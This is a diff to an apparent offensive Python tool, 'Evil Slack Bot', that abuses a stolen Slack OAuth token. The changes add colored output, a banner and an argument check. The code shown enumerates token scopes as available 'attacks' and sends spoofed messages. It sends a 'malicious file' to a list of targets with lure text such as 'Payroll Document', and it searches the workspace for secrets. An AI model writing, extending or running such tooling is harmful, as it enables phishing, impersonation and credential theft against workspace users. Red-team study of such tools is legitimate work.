@@ -3,9 +3,31 @@
 import os
 from slack import WebClient
 import argparse
+from colorama import Fore, init
 
+init(autoreset=True)
+red = Fore.RED
+green = Fore.GREEN
+blue = Fore.BLUE
+white = Fore.WHITE
 def div():
     print('------------------------------------------')
+def title():
+    print(green + '''
+    ______      _ __      
+   / ____/   __(_) /      
+  / __/ | | / / / /       
+ / /___ | |/ / / /        
+/_______|___/_/_/     __  
+  / ___// /___ ______/ /__
+  \__ \/ / __ `/ ___/ //_/
+ ___/ / / /_/ / /__/ ,<   
+/_______\__,_/\___/_/|_|  
+   / __ )____  / /_       
+  / __  / __ \/ __/       
+ / /_/ / /_/ / /_         
+/_____/\____/\__/
+''')
 parse = argparse.ArgumentParser()
 # Display help 
 parse.add_argument('-t','--token',help='Slack Oauth token',action='store',required=True)
@@ -20,28 +42,29 @@ parse.add_argument('-c','--check',help='Lookup and display the permissions and a
 args = parse.parse_args()
 
 t = WebClient(args.token)
+title()
 
 # List of tokens permissions
 perms = []
 
 def token_attacks():
     if 'search:read' in perms:
-        print(parse._option_string_actions['-s'].option_strings,parse._option_string_actions['-s'].help)
+        print(blue + str(parse._option_string_actions['-s'].option_strings),parse._option_string_actions['-s'].help)
     if 'chat:write.customize' in perms:
-        print(parse._option_string_actions['-sP'].option_strings,parse._option_string_actions['-sP'].help)
+        print(blue + str(parse._option_string_actions['-sP'].option_strings),parse._option_string_actions['-sP'].help)
     if 'chat:write' in perms:
-        print(parse._option_string_actions['-m'].option_strings,parse._option_string_actions['-m'].help)
+        print(blue + str(parse._option_string_actions['-m'].option_strings),parse._option_string_actions['-m'].help)
     if 'files:write' in perms:
-        print(parse._option_string_actions['-a'].option_strings,parse._option_string_actions['-a'].help)    
+        print(blue + str(parse._option_string_actions['-a'].option_strings),parse._option_string_actions['-a'].help)    
     
 def checkperms():
     global perms
     check = t.api_call('auth.test')
     perms = check.headers['x-oauth-scopes'].split(',')
     div()
-    print('The permissions for your token are:',perms)
+    print(green + 'The permissions for your token are:',red + str(perms))
     div()
-    print('This token allows the following attacks:')
+    print(green + 'This token allows the following attacks:')
     token_attacks()
 
 # Check tokens permissions
@@ -133,16 +156,16 @@ file_title = ''
 def setupFileMessage():
     global message,file_title
     div()
-    message = input('Type the slack message to accompany your malicious file\nExample: Please take a look at this report asap!\n')
+    message = input(green + 'Type the slack message to accompany your malicious file\nExample: Please take a look at this report asap!\n'+white)
     div()
-    file_title=input('Type the title of your file\nExample: Payroll Document\n')
+    file_title=input(green + 'Type the title of your file\nExample: Payroll Document\n'+white)
     div()
     print(
-          'Slack Message: ' + message,
-          'Title of file: ' + file_title
+          blue+'Slack Message: ' + white+message +'\n'+
+          blue+'Title of file: ' + white+file_title
         )
     div()
-    ready = input('Ready to send your message? y/n\n')
+    ready = input(red + 'Ready to send your message? y/n\n')
     if ready != 'y':
         exit()
     elif args.email_list != None:
@@ -185,47 +208,51 @@ def keywordSearch():
 if args.spoof == True:
     if 'chat:write.customize' not in perms:
         div()
-        print('ERROR: Your provided token does not have the chat:write.customize permissions.',
+        print(Fore.RED + 'ERROR: Your provided token does not have the chat:write.customize permissions.',
               'You can not send a spoofed message'
               )
         exit()
     if args.email == None and args.email_list == None:
         div()
-        print('ERROR: -sP/--spoof requires --email or --email_list')
+        print(Fore.RED + 'ERROR: -sP/--spoof requires --email or --email_list')
         exit()
     else:
         setupSpoofMessage()
 if args.message == True:
     if 'chat:write' not in perms:
         div()
-        print('ERROR: Your provided token does not have the chat:write permissions.',
+        print(Fore.RED + 'ERROR: Your provided token does not have the chat:write permissions.',
               'You can not send a spoofed message'
               )
         exit()
     if args.email == None and args.email_list == None:
         div()
-        print('ERROR: -m/--message requires --email or --email_list')
+        print(Fore.RED + 'ERROR: -m/--message requires --email or --email_list')
         exit()
     else:
         setupMessage()
 if args.attach == True:
     if 'files:write' not in perms:
         div()
-        print('ERROR: Your provided token does not have the files:write permissions.',
+        print(Fore.RED + 'ERROR: Your provided token does not have the files:write permissions.',
               'You can not send a malicious attachment'
               )
         exit()
     if args.email == None and args.email_list == None:
         div()
-        print('ERROR: -a/--attach requires --email or --email_list')
+        print(Fore.RED + 'ERROR: -a/--attach requires --email or --email_list')
+        exit()
+    if args.file == None:
+        div()
+        print(Fore.RED + 'ERROR: -a/--attach requires -f/--file')
         exit()
     else:
         setupFileMessage()
 if args.search == True:
     if 'search:read' not in perms:
         div()
-        print('ERROR: Your provided token does not have the search:read permissions.',
-              'You can not do a keyword search for secrets'
+        print(Fore.RED + 'ERROR: Your provided token does not have the search:read permissions.',
+              Fore.RED + 'You can not do a keyword search for secrets'
               )
         exit()
     else:
